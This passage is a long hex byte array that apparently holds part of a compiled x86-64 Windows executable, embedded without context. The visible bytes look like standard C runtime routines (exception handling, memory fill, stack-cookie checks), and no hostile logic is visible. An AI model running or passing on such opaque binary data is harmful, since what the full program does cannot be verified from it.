0x44, 0xd3, 0x10, 0x39, 0x44, 0xcb, 0x10, 0x75, 0xa, 0x8b, 0x44, 0xd3, 0xc, 0x39, 0x44, 0xcb, 0xc, 0x74, 0x8, 0x41, 0xff, 0xc2, 0x45, 0x3b, 0xd0, 0x72, 0xcc, 0x41, 0x8b, 0xc9, 0x45, 0x3b, 0xd1, 0x75, 0x3e, 0x8b, 0x44, 0xd3, 0x10, 0x85, 0xc0, 0x74, 0xc, 0x48, 0x3b, 0xf8, 0x75, 0x24, 0x45, 0x85, 0xdb, 0x75, 0x2c, 0xeb, 0x1d, 0x8d, 0x46, 0x1, 0xb1, 0x1, 0x41, 0x89, 0x47, 0x48, 0x44, 0x8b, 0x44, 0xd3, 0xc, 0x49, 0x8b, 0xd5, 0x4d, 0x3, 0xc4, 0x41, 0xff, 0xd0, 0x44, 0x8b, 0xb, 0x41, 0x8b, 0xc9, 0xff, 0xc6, 0x44, 0x8b, 0xc1, 0x3b, 0xf1, 0xf, 0x82, 0x56, 0xff, 0xff, 0xff, 0xb8, 0x1, 0x0, 0x0, 0x0, 0x4c, 0x8d, 0x5c, 0x24, 0x40, 0x49, 0x8b, 0x5b, 0x30, 0x49, 0x8b, 0x6b, 0x38, 0x49, 0x8b, 0x73, 0x40, 0x49, 0x8b, 0xe3, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5f, 0xc3, 0xcc, 0x48, 0x3b, 0xca, 0x74, 0x19, 0x48, 0x83, 0xc2, 0x9, 0x48, 0x8d, 0x41, 0x9, 0x48, 0x2b, 0xd0, 0x8a, 0x8, 0x3a, 0xc, 0x10, 0x75, 0xa, 0x48, 0xff, 0xc0, 0x84, 0xc9, 0x75, 0xf2, 0x33, 0xc0, 0xc3, 0x1b, 0xc0, 0x83, 0xc8, 0x1, 0xc3, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0xff, 0x15, 0xa0, 0xca, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x13, 0x48, 0x8b, 0x18, 0x48, 0x8b, 0xc8, 0xe8, 0xd0, 0x35, 0x0, 0x0, 0x48, 0x8b, 0xc3, 0x48, 0x85, 0xdb, 0x75, 0xed, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0xe8, 0xa3, 0x5, 0x0, 0x0, 0x84, 0xc0, 0x75, 0x4, 0x32, 0xc0, 0xeb, 0x12, 0xe8, 0x2a, 0x5, 0x0, 0x0, 0x84, 0xc0, 0x75, 0x7, 0xe8, 0xc1, 0x5, 0x0, 0x0, 0xeb, 0xec, 0xb0, 0x1, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0x48, 0x83, 0xec, 0x28, 0xe8, 0x4f, 0x4, 0x0, 0x0, 0x48, 0x85, 0xc0, 0xf, 0x95, 0xc0, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0x48, 0x83, 0xec, 0x28, 0x33, 0xc9, 0xe8, 0xcd, 0x3, 0x0, 0x0, 0xb0, 0x1, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0x84, 0xc9, 0x75, 0xa, 0xe8, 0x2b, 0x5, 0x0, 0x0, 0xe8, 0x7e, 0x5, 0x0, 0x0, 0xb0, 0x1, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0xe8, 0x13, 0x5, 0x0, 0x0, 0xb0, 0x1, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0x48, 0x85, 0xc9, 0x74, 0x67, 0x88, 0x54, 0x24, 0x10, 0x48, 0x83, 0xec, 0x48, 0x81, 0x39, 0x63, 0x73, 0x6d, 0xe0, 0x75, 0x53, 0x83, 0x79, 0x18, 0x4, 0x75, 0x4d, 0x8b, 0x41, 0x20, 0x2d, 0x20, 0x5, 0x93, 0x19, 0x83, 0xf8, 0x2, 0x77, 0x40, 0x48, 0x8b, 0x41, 0x30, 0x48, 0x85, 0xc0, 0x74, 0x37, 0x48, 0x63, 0x50, 0x4, 0x85, 0xd2, 0x74, 0x11, 0x48, 0x3, 0x51, 0x38, 0x48, 0x8b, 0x49, 0x28, 0xe8, 0x2a, 0x0, 0x0, 0x0, 0xeb, 0x20, 0xeb, 0x1e, 0xf6, 0x0, 0x10, 0x74, 0x19, 0x48, 0x8b, 0x41, 0x28, 0x48, 0x8b, 0x8, 0x48, 0x85, 0xc9, 0x74, 0xd, 0x48, 0x8b, 0x1, 0x48, 0x8b, 0x40, 0x10, 0xff, 0x15, 0x74, 0xcb, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x48, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0xff, 0xe2, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xd9, 0xe8, 0x66, 0x3, 0x0, 0x0, 0x48, 0x8b, 0x50, 0x58, 0xeb, 0x9, 0x48, 0x39, 0x1a, 0x74, 0x12, 0x48, 0x8b, 0x52, 0x8, 0x48, 0x85, 0xd2, 0x75, 0xf2, 0x8d, 0x42, 0x1, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0x33, 0xc0, 0xeb, 0xf6, 0xcc, 0x48, 0x63, 0x2, 0x48, 0x3, 0xc1, 0x83, 0x7a, 0x4, 0x0, 0x7c, 0x16, 0x4c, 0x63, 0x4a, 0x4, 0x48, 0x63, 0x52, 0x8, 0x49, 0x8b, 0xc, 0x9, 0x4c, 0x63, 0x4, 0xa, 0x4d, 0x3, 0xc1, 0x49, 0x3, 0xc0, 0xc3, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0x39, 0x48, 0x8b, 0xd9, 0x81, 0x3f, 0x52, 0x43, 0x43, 0xe0, 0x74, 0x12, 0x81, 0x3f, 0x4d, 0x4f, 0x43, 0xe0, 0x74, 0xa, 0x81, 0x3f, 0x63, 0x73, 0x6d, 0xe0, 0x74, 0x22, 0xeb, 0x13, 0xe8, 0xf1, 0x2, 0x0, 0x0, 0x83, 0x78, 0x30, 0x0, 0x7e, 0x8, 0xe8, 0xe6, 0x2, 0x0, 0x0, 0xff, 0x48, 0x30, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x33, 0xc0, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xe8, 0xd1, 0x2, 0x0, 0x0, 0x48, 0x89, 0x78, 0x20, 0x48, 0x8b, 0x5b, 0x8, 0xe8, 0xc4, 0x2, 0x0, 0x0, 0x48, 0x89, 0x58, 0x28, 0xe8, 0xeb, 0x33, 0x0, 0x0, 0xcc, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0xe8, 0xdf, 0x33, 0x0, 0x0, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x66, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0x57, 0x8b, 0xc2, 0x48, 0x8b, 0xf9, 0x49, 0x8b, 0xc8, 0xf3, 0xaa, 0x49, 0x8b, 0xc3, 0x5f, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x66, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4c, 0x8b, 0xd9, 0xf, 0xb6, 0xd2, 0x49, 0xb9, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x4c, 0xf, 0xaf, 0xca, 0x49, 0x83, 0xf8, 0x10, 0xf, 0x86, 0xf2, 0x0, 0x0, 0x0, 0x66, 0x49, 0xf, 0x6e, 0xc1, 0x66, 0xf, 0x60, 0xc0, 0x49, 0x81, 0xf8, 0x80, 0x0, 0x0, 0x0, 0x77, 0x10, 0xe9, 0x6b, 0x0, 0x0, 0x0, 0x66, 0x66, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf6, 0x5, 0x81, 0x73, 0x1, 0x0, 0x2, 0x75, 0x97, 0xf, 0x11, 0x1, 0x4c, 0x3, 0xc1, 0x48, 0x83, 0xc1, 0x10, 0x48, 0x83, 0xe1, 0xf0, 0x4c, 0x2b, 0xc1, 0x4d, 0x8b, 0xc8, 0x49, 0xc1, 0xe9, 0x7, 0x74, 0x3d, 0x4c, 0x3b, 0xd, 0x9e, 0x68, 0x1, 0x0, 0xf, 0x87, 0x60, 0x0, 0x0, 0x0, 0xf, 0x29, 0x1, 0xf, 0x29, 0x41, 0x10, 0x48, 0x81, 0xc1, 0x80, 0x0, 0x0, 0x0, 0xf, 0x29, 0x41, 0xa0, 0xf, 0x29, 0x41, 0xb0, 0x49, 0xff, 0xc9, 0xf, 0x29, 0x41, 0xc0, 0xf, 0x29, 0x41, 0xd0, 0xf, 0x29, 0x41, 0xe0, 0x66, 0xf, 0x29, 0x41, 0xf0, 0x75, 0xd4, 0x49, 0x83, 0xe0, 0x7f, 0x4d, 0x8b, 0xc8, 0x49, 0xc1, 0xe9, 0x4, 0x74, 0x13, 0xf, 0x1f, 0x80, 0x0, 0x0, 0x0, 0x0, 0xf, 0x11, 0x1, 0x48, 0x83, 0xc1, 0x10, 0x49, 0xff, 0xc9, 0x75, 0xf4, 0x49, 0x83, 0xe0, 0xf, 0x74, 0x6, 0x42, 0xf, 0x11, 0x44, 0x1, 0xf0, 0x49, 0x8b, 0xc3, 0xc3, 0xf, 0x1f, 0x40, 0x0, 0xf, 0x2b, 0x1, 0xf, 0x2b, 0x41, 0x10, 0x48, 0x81, 0xc1, 0x80, 0x0, 0x0, 0x0, 0xf, 0x2b, 0x41, 0xa0, 0xf, 0x2b, 0x41, 0xb0, 0x49, 0xff, 0xc9, 0xf, 0x2b, 0x41, 0xc0, 0xf, 0x2b, 0x41, 0xd0, 0xf, 0x2b, 0x41, 0xe0, 0xf, 0x2b, 0x41, 0xf0, 0x75, 0xd5, 0xf, 0xae, 0xf8, 0x49, 0x83, 0xe0, 0x7f, 0xeb, 0x9c, 0x66, 0x66, 0x66, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0x49, 0x8b, 0xd1, 0x4c, 0x8d, 0xd, 0x96, 0xd6, 0xff, 0xff, 0x43, 0x8b, 0x84, 0x81, 0xb0, 0xc0, 0x1, 0x0, 0x4c, 0x3, 0xc8, 0x49, 0x3, 0xc8, 0x49, 0x8b, 0xc3, 0x41, 0xff, 0xe1, 0x66, 0x90, 0x48, 0x89, 0x51, 0xf1, 0x89, 0x51, 0xf9, 0x66, 0x89, 0x51, 0xfd, 0x88, 0x51, 0xff, 0xc3, 0x90, 0x48, 0x89, 0x51, 0xf4, 0x89, 0x51, 0xfc, 0xc3, 0x48, 0x89, 0x51, 0xf7, 0x88, 0x51, 0xff, 0xc3, 0x48, 0x89, 0x51, 0xf3, 0x89, 0x51, 0xfb, 0x88, 0x51, 0xff, 0xc3, 0xf, 0x1f, 0x44, 0x0, 0x0, 0x48, 0x89, 0x51, 0xf2, 0x89, 0x51, 0xfa, 0x66, 0x89, 0x51, 0xfe, 0xc3, 0x48, 0x89, 0x10, 0xc3, 0x48, 0x89, 0x10, 0x66, 0x89, 0x50, 0x8, 0x88, 0x50, 0xa, 0xc3, 0xf, 0x1f, 0x44, 0x0, 0x0, 0x48, 0x89, 0x10, 0x66, 0x89, 0x50, 0x8, 0xc3, 0x48, 0x89, 0x10, 0x48, 0x89, 0x50, 0x8, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x66, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0x89, 0x4c, 0x24, 0x8, 0x48, 0x89, 0x54, 0x24, 0x18, 0x44, 0x89, 0x44, 0x24, 0x10, 0x49, 0xc7, 0xc1, 0x20, 0x5, 0x93, 0x19, 0xeb, 0x8, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x66, 0x90, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x8b, 0x5, 0x85, 0xc8, 0x0, 0x0, 0x48, 0x8d, 0x15, 0x66, 0xf1, 0xff, 0xff, 0x48, 0x3b, 0xc2, 0x74, 0x23, 0x65, 0x48, 0x8b, 0x4, 0x25, 0x30, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x89, 0x98, 0x0, 0x0, 0x0, 0x48, 0x3b, 0x48, 0x10, 0x72, 0x6, 0x48, 0x3b, 0x48, 0x8, 0x76, 0x7, 0xb9, 0xd, 0x0, 0x0, 0x0, 0xcd, 0x29, 0xc3, 0xcc, 0x48, 0x83, 0xec, 0x28, 0x48, 0x85, 0xc9, 0x74, 0x11, 0x48, 0x8d, 0x5, 0x24, 0x72, 0x1, 0x0, 0x48, 0x3b, 0xc8, 0x74, 0x5, 0xe8, 0xb2, 0x31, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xd9, 0x8b, 0xd, 0xd5, 0x66, 0x1, 0x0, 0x83, 0xf9, 0xff, 0x74, 0x33, 0x48, 0x85, 0xdb, 0x75, 0xe, 0xe8, 0x7e, 0x9, 0x0, 0x0, 0x8b, 0xd, 0xc0, 0x66, 0x1, 0x0, 0x48, 0x8b, 0xd8, 0x33, 0xd2, 0xe8, 0xb6, 0x9, 0x0, 0x0, 0x48, 0x85, 0xdb, 0x74, 0x14, 0x48, 0x8d, 0x5, 0xda, 0x71, 0x1, 0x0, 0x48, 0x3b, 0xd8, 0x74, 0x8, 0x48, 0x8b, 0xcb, 0xe8, 0x65, 0x31, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0xe8, 0x13, 0x0, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x5, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xe8, 0xc0, 0x31, 0x0, 0x0, 0xcc, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, 0x83, 0xec, 0x20, 0x83, 0x3d, 0x62, 0x66, 0x1, 0x0, 0xff, 0x75, 0x7, 0x33, 0xc0, 0xe9, 0x90, 0x0, 0x0, 0x0, 0xff, 0x15, 0xe3, 0xc5, 0x0, 0x0, 0x8b, 0xd, 0x4d, 0x66, 0x1, 0x0, 0x8b, 0xf8, 0xe8, 0xfe, 0x8, 0x0, 0x0, 0x48, 0x83, 0xca, 0xff, 0x33, 0xf6, 0x48, 0x3b, 0xc2, 0x74, 0x67, 0x48, 0x85, 0xc0, 0x74, 0x5, 0x48, 0x8b, 0xf0, 0xeb, 0x5d, 0x8b, 0xd, 0x2b, 0x66, 0x1, 0x0, 0xe8, 0x26, 0x9, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x4e, 0xba, 0x80, 0x0, 0x0, 0x0, 0x8d, 0x4a, 0x81, 0xe8, 0x35, 0x33, 0x0, 0x0, 0x8b, 0xd, 0xf, 0x66, 0x1, 0x0, 0x48, 0x8b, 0xd8, 0x48, 0x85, 0xc0, 0x74, 0x24, 0x48, 0x8b, 0xd0, 0xe8, 0xff, 0x8, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x12, 0x48, 0x8b, 0xc3, 0xc7, 0x43, 0x78, 0xfe, 0xff, 0xff, 0xff, 0x48, 0x8b, 0xde, 0x48, 0x8b, 0xf0, 0xeb, 0xd, 0x8b, 0xd, 0xe3, 0x65, 0x1, 0x0, 0x33, 0xd2, 0xe8, 0xdc, 0x8, 0x0, 0x0, 0x48, 0x8b, 0xcb, 0xe8, 0x9c, 0x30, 0x0, 0x0, 0x8b, 0xcf, 0xff, 0x15, 0x64, 0xc5, 0x0, 0x0, 0x48, 0x8b, 0xc6, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0x74, 0x24, 0x38, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0x48, 0x83, 0xec, 0x28, 0x48, 0x8d, 0xd, 0xa9, 0xfe, 0xff, 0xff, 0xe8, 0xd0, 0x7, 0x0, 0x0, 0x89, 0x5, 0xa2, 0x65, 0x1, 0x0, 0x83, 0xf8, 0xff, 0x74, 0x25, 0x48, 0x8d, 0x15, 0xc6, 0x70, 0x1, 0x0, 0x8b, 0xc8, 0xe8, 0x8f, 0x8, 0x0, 0x0, 0x85, 0xc0, 0x74, 0xe, 0xc7, 0x5, 0x29, 0x71, 0x1, 0x0, 0xfe, 0xff, 0xff, 0xff, 0xb0, 0x1, 0xeb, 0x7, 0xe8, 0x8, 0x0, 0x0, 0x0, 0x32, 0xc0, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0x48, 0x83, 0xec, 0x28, 0x8b, 0xd, 0x66, 0x65, 0x1, 0x0, 0x83, 0xf9, 0xff, 0x74, 0xc, 0xe8, 0xcc, 0x7, 0x0, 0x0, 0x83, 0xd, 0x55, 0x65, 0x1, 0x0, 0xff, 0xb0, 0x1, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0x45, 0x33, 0xc0, 0x48, 0x8d, 0xd, 0xee, 0x70, 0x1, 0x0, 0xba, 0xa0, 0xf, 0x0, 0x0, 0xe8, 0x88, 0x8, 0x0, 0x0, 0x85, 0xc0, 0x74, 0xa, 0xff, 0x5, 0x2, 0x71, 0x1, 0x0, 0xb0, 0x1, 0xeb, 0x7, 0xe8, 0x9, 0x0, 0x0, 0x0, 0x32, 0xc0, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x8b, 0x1d, 0xe4, 0x70, 0x1, 0x0, 0xeb, 0x1d, 0x48, 0x8d, 0x5, 0xb3, 0x70, 0x1, 0x0, 0xff, 0xcb, 0x48, 0x8d, 0xc, 0x9b, 0x48, 0x8d, 0xc, 0xc8, 0xff, 0x15, 0xa3, 0xc4, 0x0, 0x0, 0xff, 0xd, 0xc5, 0x70, 0x1, 0x0, 0x85, 0xdb, 0x75, 0xdf, 0xb0, 0x1, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0x48, 0x8b, 0xc4, 0x4c, 0x89, 0x48, 0x20, 0x4c, 0x89, 0x40, 0x18, 0x48, 0x89, 0x50, 0x10, 0x48, 0x89, 0x48, 0x8, 0x53, 0x48, 0x83, 0xec, 0x70, 0x48, 0x8b, 0xd9, 0x83, 0x60, 0xc8, 0x0, 0x48, 0x89, 0x48, 0xe0, 0x4c, 0x89, 0x40, 0xe8, 0xe8, 0x20, 0xfe, 0xff, 0xff, 0x48, 0x8d, 0x54, 0x24, 0x58, 0x8b, 0xb, 0x48, 0x8b, 0x40, 0x10, 0xff, 0x15, 0x3, 0xc6, 0x0, 0x0, 0xc7, 0x44, 0x24, 0x40, 0x0, 0x0, 0x0, 0x0, 0xeb, 0x0, 0x8b, 0x44, 0x24, 0x40, 0x48, 0x83, 0xc4, 0x70, 0x5b, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, 0x83, 0xec, 0x20, 0x8b, 0x59, 0xc, 0x8b, 0xfa, 0x48, 0x8b, 0xf1, 0x85, 0xdb, 0x74, 0x26, 0xff, 0xcb, 0xe8, 0xd6, 0xfd, 0xff, 0xff, 0x48, 0x8d, 0xc, 0x9b, 0x48, 0x8b, 0x40, 0x60, 0x48, 0x8d, 0x14, 0x88, 0x48, 0x63, 0x46, 0x10, 0x48, 0x3, 0xc2, 0x3b, 0x78, 0x4, 0x7e, 0xdd, 0x3b, 0x78, 0x8, 0x7f, 0xd8, 0xeb, 0x2, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0x74, 0x24, 0x38, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xda, 0x48, 0x8b, 0xd1, 0x48, 0x8b, 0xcb, 0xe8, 0x78, 0x8, 0x0, 0x0, 0x8b, 0xd0, 0x48, 0x8b, 0xcb, 0xe8, 0x8e, 0xff, 0xff, 0xff, 0x48, 0x85, 0xc0, 0xf, 0x95, 0xc0, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, 0x83, 0xec, 0x20, 0x4c, 0x8d, 0x4c, 0x24, 0x48, 0x49, 0x8b, 0xd8, 0x48, 0x8b, 0xfa, 0xe8, 0x45, 0x0, 0x0, 0x0, 0x48, 0x8b, 0xd7, 0x48, 0x8b, 0xcb, 0x48, 0x8b, 0xf0, 0xe8, 0x33, 0x8, 0x0, 0x0, 0x8b, 0xd0, 0x48, 0x8b, 0xcb, 0xe8, 0x49, 0xff, 0xff, 0xff, 0x48, 0x85, 0xc0, 0x75, 0x6, 0x41, 0x83, 0xc9, 0xff, 0xeb, 0x4, 0x44, 0x8b, 0x48, 0x4, 0x4c, 0x8b, 0xc3, 0x48, 0x8b, 0xd7, 0x48, 0x8b, 0xce, 0xe8, 0xc4, 0x19, 0x0, 0x0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0x74, 0x24, 0x38, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0x48, 0x89, 0x5c, 0x24, 0x10, 0x48, 0x89, 0x6c, 0x24, 0x18, 0x56, 0x57, 0x41, 0x54, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xec, 0x20, 0x41, 0x8b, 0x78, 0xc, 0x4c, 0x8b, 0xe1, 0x49, 0x8b, 0xc8, 0x49, 0x8b, 0xf1, 0x4d, 0x8b, 0xf0, 0x4c, 0x8b, 0xfa, 0xe8, 0xce, 0x7, 0x0, 0x0, 0x4d, 0x8b, 0x14, 0x24, 0x8b, 0xe8, 0x4c, 0x89, 0x16, 0x85, 0xff, 0x74, 0x74, 0x49, 0x63, 0x46, 0x10, 0xff, 0xcf, 0x48, 0x8d, 0x14, 0xbf, 0x48, 0x8d, 0x1c, 0x90, 0x49, 0x3, 0x5f, 0x8, 0x3b, 0x6b, 0x4, 0x7e, 0xe5, 0x3b, 0x6b, 0x8, 0x7f, 0xe0, 0x49, 0x8b, 0xf, 0x48, 0x8d, 0x54, 0x24, 0x50, 0x45, 0x33, 0xc0, 0xff, 0x15, 0x78, 0xc2, 0x0, 0x0, 0x4c, 0x63, 0x43, 0x10, 0x33, 0xc9, 0x4c, 0x3, 0x44, 0x24, 0x50, 0x44, 0x8b, 0x4b, 0xc, 0x44, 0x8b, 0x10, 0x45, 0x85, 0xc9, 0x74, 0x17, 0x49, 0x8d, 0x50, 0xc, 0x48, 0x63, 0x2, 0x49, 0x3b, 0xc2, 0x74, 0x10, 0xff, 0xc1, 0x48, 0x83, 0xc2, 0x14, 0x41, 0x3b, 0xc9, 0x72, 0xed, 0x41, 0x3b, 0xc9, 0x73, 0x9c, 0x49, 0x8b, 0x4, 0x24, 0x48, 0x8d, 0xc, 0x89, 0x49, 0x63, 0x4c, 0x88, 0x10, 0x48, 0x8b, 0xc, 0x1, 0x48, 0x89, 0xe, 0x48, 0x8b, 0x5c, 0x24, 0x58, 0x48, 0x8b, 0xc6, 0x48, 0x8b, 0x6c, 0x24, 0x60, 0x48, 0x83, 0xc4, 0x20, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5c, 0x5f, 0x5e, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x6c, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xec, 0x40, 0x48, 0x8b, 0x9c, 0x24, 0x90, 0x0, 0x0, 0x0, 0x4c, 0x8b, 0xe2, 0x48, 0x8b, 0xe9, 0x49, 0x8b, 0xd1, 0x48, 0x8b, 0xcb, 0x49, 0x8b, 0xf9, 0x45, 0x8b, 0xf8, 0x44, 0x8b, 0x73, 0xc, 0xe8, 0xf1, 0x6, 0x0, 0x0, 0x45, 0x33, 0xd2, 0x8b, 0xf0, 0x45, 0x85, 0xf6, 0xf, 0x84, 0xec, 0x0, 0x0, 0x0, 0x4c, 0x8b, 0x47, 0x8, 0x83, 0xc8, 0xff, 0x4c, 0x63, 0x5b, 0x10, 0x44, 0x8b, 0xc8, 0x44, 0x8b, 0xe8, 0x41, 0x8b, 0xd6, 0x8d, 0x5a, 0xff, 0x48, 0x8d, 0xc, 0x9b, 0x49, 0x8d, 0x4, 0x88, 0x42, 0x3b, 0x74, 0x18, 0x4, 0x7e, 0x7, 0x42, 0x3b, 0x74, 0x18, 0x8, 0x7e, 0xc, 0x8b, 0xd3, 0x8b, 0xc3, 0x85, 0xdb, 0x75, 0xdf, 0x85, 0xc0, 0x74, 0x10, 0x8d, 0x42, 0xff, 0x48, 0x8d, 0x4, 0x80, 0x49, 0x8d, 0x14, 0x83, 0x49, 0x3, 0xd0, 0xeb, 0x3, 0x49, 0x8b, 0xd2, 0x4b, 0x8d, 0xc, 0x18, 0x45, 0x8b, 0xc2, 0x41, 0x83, 0xcb, 0xff, 0x48, 0x85, 0xd2, 0x74, 0xf, 0x8b, 0x42, 0x4, 0x39, 0x1, 0x7e, 0x23, 0x8b, 0x42, 0x8, 0x39, 0x41, 0x4, 0x7f, 0x1b, 0x44, 0x3b, 0x39, 0x7c, 0x16, 0x44, 0x3b, 0x79, 0x4, 0x7f, 0x10, 0x45, 0x3b, 0xcb, 0x41, 0x8b, 0xc0, 0x45, 0x8b, 0xe8, 0x41, 0xf, 0x45, 0xc1, 0x44, 0x8b, 0xc8, 0x41, 0xff, 0xc0, 0x48, 0x83, 0xc1, 0x14, 0x45, 0x3b, 0xc6, 0x72, 0xc5, 0x45, 0x3b, 0xcb, 0x4c, 0x89, 0x64, 0x24, 0x20, 0x41, 0x8b, 0xc2, 0x4c, 0x89, 0x64, 0x24, 0x30, 0x41, 0xf, 0x45, 0xc1, 0x4c, 0x8d, 0x5c, 0x24, 0x40, 0x49, 0x8b, 0x5b, 0x30, 0x49, 0x8b, 0x73, 0x40, 0x89, 0x44, 0x24, 0x28, 0x41, 0x8d, 0x45, 0x1, 0xf, 0x10, 0x44, 0x24, 0x20, 0x44, 0xf, 0x45, 0xd0, 0x48, 0x8b, 0xc5, 0x44, 0x89, 0x54, 0x24, 0x38, 0xf, 0x10, 0x4c, 0x24, 0x30, 0xf3, 0xf, 0x7f, 0x45, 0x0, 0xf3, 0xf, 0x7f, 0x4d, 0x10, 0x49, 0x8b, 0x6b, 0x38, 0x49, 0x8b, 0xe3, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5f, 0xc3, 0xe8, 0xe2, 0x2c, 0x0, 0x0, 0xcc, 0xcc, 0x40, 0x55, 0x48, 0x8d, 0x6c, 0x24, 0xe1, 0x48, 0x81, 0xec, 0xe0, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x5, 0x67, 0x61, 0x1, 0x0, 0x48, 0x33, 0xc4, 0x48, 0x89, 0x45, 0xf, 0x4c, 0x8b, 0x55, 0x77, 0x48, 0x8d, 0x5, 0x55, 0xd1, 0x0, 0x0, 0xf, 0x10, 0x0, 0x4c, 0x8b, 0xd9, 0x48, 0x8d, 0x4c, 0x24, 0x30, 0xf, 0x10, 0x48, 0x10, 0xf, 0x11, 0x1, 0xf, 0x10, 0x40, 0x20, 0xf, 0x11, 0x49, 0x10, 0xf, 0x10, 0x48, 0x30, 0xf, 0x11, 0x41, 0x20, 0xf, 0x10, 0x40, 0x40, 0xf, 0x11, 0x49, 0x30, 0xf, 0x10, 0x48, 0x50, 0xf, 0x11, 0x41, 0x40, 0xf, 0x10, 0x40, 0x60, 0xf, 0x11, 0x49, 0x50, 0xf, 0x10, 0x88, 0x80, 0x0, 0x0, 0x0, 0xf, 0x11, 0x41, 0x60, 0xf, 0x10, 0x40, 0x70, 0x48, 0x8b, 0x80, 0x90, 0x0, 0x0, 0x0, 0xf, 0x11, 0x41, 0x70, 0xf, 0x11, 0x89, 0x80, 0x0, 0x0, 0x0, 0x48, 0x89, 0x81, 0x90, 0x0, 0x0, 0x0, 0x48, 0x8d, 0x5, 0xa4, 0x14, 0x0, 0x0, 0x49, 0x8b, 0xb, 0x48, 0x89, 0x45, 0x8f, 0x48, 0x8b, 0x45, 0x4f, 0x48, 0x89, 0x45, 0x9f, 0x48, 0x63, 0x45, 0x5f, 0x48, 0x89, 0x45, 0xa7, 0x48, 0x8b, 0x45, 0x57, 0x48, 0x89, 0x45, 0xb7, 0xf, 0xb6, 0x45, 0x7f, 0x48, 0x89, 0x45, 0xc7, 0x49, 0x8b, 0x42, 0x40, 0x48, 0x89, 0x44, 0x24, 0x28, 0x49, 0x8b, 0x42, 0x28, 0x4c, 